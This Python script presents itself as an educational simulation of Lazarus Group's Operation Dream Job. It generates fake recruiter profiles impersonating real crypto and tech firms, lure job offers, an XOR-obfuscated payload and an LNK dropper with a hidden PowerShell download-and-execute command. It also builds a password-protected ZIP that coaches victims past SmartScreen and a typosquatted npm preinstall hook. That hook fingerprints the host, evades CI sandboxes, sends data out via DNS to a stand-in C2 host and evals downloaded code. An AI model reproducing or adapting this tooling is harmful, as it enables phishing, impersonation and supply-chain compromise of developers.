# Lazarus Group - Operation Dream Job Lure Generator
# Demonstrates social engineering via fake recruiter profiles and trojanized job applications
# MITRE ATT&CK: T1566.003 (Spearphishing via Service), T1204.002 (Malicious File)

# For educational and research purposes only
# Author: Nour A
# Reference: https://securelist.com/lazarus-operation-dreamjob/114858/

import os
import sys
import json
import base64
import hashlib
import struct
import zipfile
import io
import random
import string
from datetime import datetime


# XOR encryption key used for payload obfuscation
DEFAULT_XOR_KEY = b"\x4c\x41\x5a\x41\x52\x55\x53"  # "LAZARUS"


def xor_encrypt(data, key):
    """XOR encryption used by Lazarus for payload obfuscation.
    Simple but effective for evading static analysis.
    """
    encrypted = bytearray(len(data))
    for i in range(len(data)):
        encrypted[i] = data[i] ^ key[i % len(key)]
    return bytes(encrypted)


def generate_fake_profile():
    """Generate a convincing fake LinkedIn recruiter profile.
    Lazarus creates profiles impersonating real tech company recruiters.
    """
    companies = [
        {"name": "Coinbase", "domain": "coinbase.com", "sector": "Cryptocurrency"},
        {"name": "Meta", "domain": "meta.com", "sector": "Technology"},
        {"name": "Crypto.com", "domain": "crypto.com", "sector": "Cryptocurrency"},
        {"name": "Binance", "domain": "binance.com", "sector": "Cryptocurrency"},
        {"name": "Kraken", "domain": "kraken.com", "sector": "Cryptocurrency"},
    ]
    titles = [
        "Senior Technical Recruiter",
        "Head of Talent Acquisition",
        "Engineering Recruitment Lead",
        "VP of People Operations",
    ]
    first_names = ["Sarah", "Michael", "Jennifer", "David", "Amanda", "James"]
    last_names = ["Chen", "Williams", "Anderson", "Thompson", "Martinez"]

    company = random.choice(companies)
    profile = {
        "name": f"{random.choice(first_names)} {random.choice(last_names)}",
        "title": random.choice(titles),
        "company": company["name"],
        "company_domain": company["domain"],
        "sector": company["sector"],
        "location": random.choice(["San Francisco, CA", "New York, NY",
                                    "Austin, TX", "Singapore"]),
        "connections": random.randint(450, 800),
        "headline": f"{random.choice(titles)} at {company['name']} | "
                    f"Hiring Top Talent in {company['sector']}",
    }
    return profile


def generate_lure_document(profile, payload_data=None):
    """Generate a trojanized job offer document.
    The document contains an embedded payload that executes on open.
    Lazarus typically uses DOCX with embedded macros or LNK files.
    """
    job_title = random.choice([
        "Senior Blockchain Engineer",
        "Smart Contract Security Auditor",
        "DeFi Protocol Developer",
        "Principal Cryptography Engineer",
    ])

    salary_range = f"${random.randint(200, 350)},000 - ${random.randint(400, 600)},000"

    # generate the lure content
    lure_text = f"""
{'=' * 60}
CONFIDENTIAL - JOB OFFER

Company: {profile['company']}
Position: {job_title}
Location: {profile['location']} (Hybrid)
Compensation: {salary_range} + Equity + Signing Bonus

Recruiter: {profile['name']}
Email: {profile['name'].lower().replace(' ', '.')}@{profile['company_domain']}
{'=' * 60}

Dear Candidate,

We were very impressed with your background and believe you
would be an excellent fit for our {job_title} role.

Please review the attached skills assessment to proceed to
the technical interview stage.

Best regards,
{profile['name']}
{profile['title']}
{profile['company']}
"""

    # if payload data provided, embed it (XOR encrypted + base64)
    embedded_payload = None
    if payload_data:
        encrypted = xor_encrypt(payload_data, DEFAULT_XOR_KEY)
        embedded_payload = base64.b64encode(encrypted).decode()

    return {
        "text": lure_text,
        "job_title": job_title,
        "salary": salary_range,
        "embedded_payload": embedded_payload
    }


def create_lnk_payload():
    """Generate a malicious LNK (shortcut) file structure.
    Lazarus distributes LNK files disguised as PDF job offers.
    The LNK executes PowerShell to download and run the actual payload.
    """
    # LNK file header (Shell Link Binary format)
    # Reference: MS-SHLLINK specification
    lnk_header = struct.pack(
        "<I",
        0x0000004C  # HeaderSize (always 0x4C)
    )
    # CLSID for ShellLink
    lnk_clsid = b"\x01\x14\x02\x00\x00\x00\x00\x00"
    lnk_clsid += b"\xC0\x00\x00\x00\x00\x00\x00\x46"

    # LinkFlags: HasTargetIDList | HasLinkInfo | HasRelativePath |
    # HasArguments | HasIconLocation
    link_flags = struct.pack("<I", 0x000000FF)

    # the powershell command the LNK will execute
    ps_command = (
        "powershell -w hidden -ep bypass -c "
        "\"$u='https://cdn.example.com/update.dat';"
        "$d=[System.IO.Path]::GetTempPath()+'svchost.exe';"
        "(New-Object Net.WebClient).DownloadFile($u,$d);"
        "Start-Process $d\""
    )

    return {
        "header_size": len(lnk_header),
        "command": ps_command,
        "disguise": "Job_Offer_Details.pdf.lnk",
        "icon": "%SystemRoot%\\System32\\shell32.dll,1",  # PDF icon
        "file_attributes": "FILE_ATTRIBUTE_NORMAL"
    }


def create_zip_archive(lure_doc, lnk_data):
    """Package the lure and payload into a password-protected ZIP.
    Lazarus uses password-protected archives to bypass email scanners.
    """
    buffer = io.BytesIO()
    password = "offer2024"

    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # add the lure document
        zf.writestr("Job_Offer_Details.txt", lure_doc["text"])

        # add a fake skills assessment (which is really the LNK)
        assessment_content = (
            f"# Skills Assessment - {lure_doc['job_title']}\n\n"
            "Please open the assessment application to begin.\n"
            "Assessment time limit: 90 minutes\n\n"
            "NOTE: If Windows SmartScreen blocks the assessment,\n"
            "click 'More info' -> 'Run anyway'\n"
        )
        zf.writestr("Skills_Assessment/README.txt", assessment_content)
        zf.writestr("Skills_Assessment/Assessment.lnk",
                     json.dumps(lnk_data, indent=2))

    return buffer.getvalue(), password


def generate_npm_typosquat():
    """Simulate a malicious npm package for supply chain attack.
    Lazarus published typosquatted packages like 'js-pdfkit' targeting
    developers at crypto exchanges.
    """
    targets = [
        {"legit": "pdf-lib", "typosquat": "pdff-lib"},
        {"legit": "ethers", "typosquat": "ethers-js"},
        {"legit": "web3", "typosquat": "web3-utils-js"},
        {"legit": "crypto-js", "typosquat": "crypto-jss"},
    ]

    target = random.choice(targets)

    package_json = {
        "name": target["typosquat"],
        "version": "1.0.2",
        "description": f"Utility library for {target['legit']}",
        "main": "index.js",
        "scripts": {
            "preinstall": "node preinstall.js"
        },
        "author": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
        "license": "MIT"
    }

    # preinstall hook is the attack vector
    preinstall_js = """
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

// environment fingerprinting
const info = {
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
    home: os.homedir(),
    cwd: process.cwd()
};

// check for CI/CD environments (avoid sandbox detection)
const ci_vars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'TRAVIS'];
const is_ci = ci_vars.some(v => process.env[v]);
if (is_ci) process.exit(0);

// exfiltrate host info via DNS (stealthy)
const encoded = Buffer.from(JSON.stringify(info)).toString('hex');
const chunks = encoded.match(/.{1,60}/g);
chunks.forEach((chunk, i) => {
    try {
        require('dns').lookup(`${chunk}.${i}.c2.example.com`, () => {});
    } catch(e) {}
});

// download second stage
const url = 'https://cdn.example.com/update';
https.get(url, (res) => {
    let data = '';
    res.on('data', d => data += d);
    res.on('end', () => {
        try { eval(data); } catch(e) {}
    });
}).on('error', () => {});
"""

    return {
        "package_json": package_json,
        "preinstall_code": preinstall_js,
        "typosquatting": target
    }


def main():
    print("=" * 70)
    print("LAZARUS GROUP - OPERATION DREAM JOB")
    print("Social Engineering & Payload Delivery Simulation")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print("[!] Reference: Kaspersky - Operation Dream Job Analysis")
    print()

    # Stage 1: Generate fake recruiter profile
    print("[STAGE 1] Generating Fake Recruiter Profile")
    print("-" * 50)
    profile = generate_fake_profile()
    for key, value in profile.items():
        print(f"  {key}: {value}")
    print()

    # Stage 2: Create lure document with embedded payload
    print("[STAGE 2] Creating Trojanized Job Offer")
    print("-" * 50)
    dummy_payload = b"\x90" * 64  # NOP sled placeholder
    lure = generate_lure_document(profile, dummy_payload)
    print(f"  Job Title: {lure['job_title']}")
    print(f"  Salary Range: {lure['salary']}")
    print(f"  Embedded Payload: {len(lure['embedded_payload'])} bytes (XOR + base64)")
    print(f"  XOR Key: {DEFAULT_XOR_KEY.hex()}")
    print()

    # Stage 3: Create LNK payload
    print("[STAGE 3] Creating LNK Dropper")
    print("-" * 50)
    lnk = create_lnk_payload()
    print(f"  Disguise: {lnk['disguise']}")
    print(f"  Icon: {lnk['icon']}")
    print(f"  Command: {lnk['command'][:60]}...")
    print()

    # Stage 4: Package into archive
    print("[STAGE 4] Creating Delivery Archive")
    print("-" * 50)
    archive_data, password = create_zip_archive(lure, lnk)
    archive_hash = hashlib.sha256(archive_data).hexdigest()
    print(f"  Archive Size: {len(archive_data)} bytes")
    print(f"  Password: {password}")
    print(f"  SHA256: {archive_hash}")
    print()

    # Stage 5: npm supply chain attack
    print("[STAGE 5] Supply Chain Attack (npm Typosquatting)")
    print("-" * 50)
    npm = generate_npm_typosquat()
    print(f"  Legitimate package: {npm['typosquatting']['legit']}")
    print(f"  Typosquat package: {npm['typosquatting']['typosquat']}")
    print(f"  Attack vector: preinstall hook")
    print(f"  Evasion: CI/CD environment detection")
    print()

    print("=" * 70)
    print("[+] OPERATION DREAM JOB SIMULATION COMPLETE")
    print("  Techniques demonstrated:")
    print("  - Fake recruiter profile generation")
    print("  - XOR-encrypted payload embedding")
    print("  - LNK file payload with PowerShell dropper")
    print("  - Password-protected archive packaging")
    print("  - npm supply chain typosquatting")
    print("=" * 70)


if __name__ == "__main__":
    main()
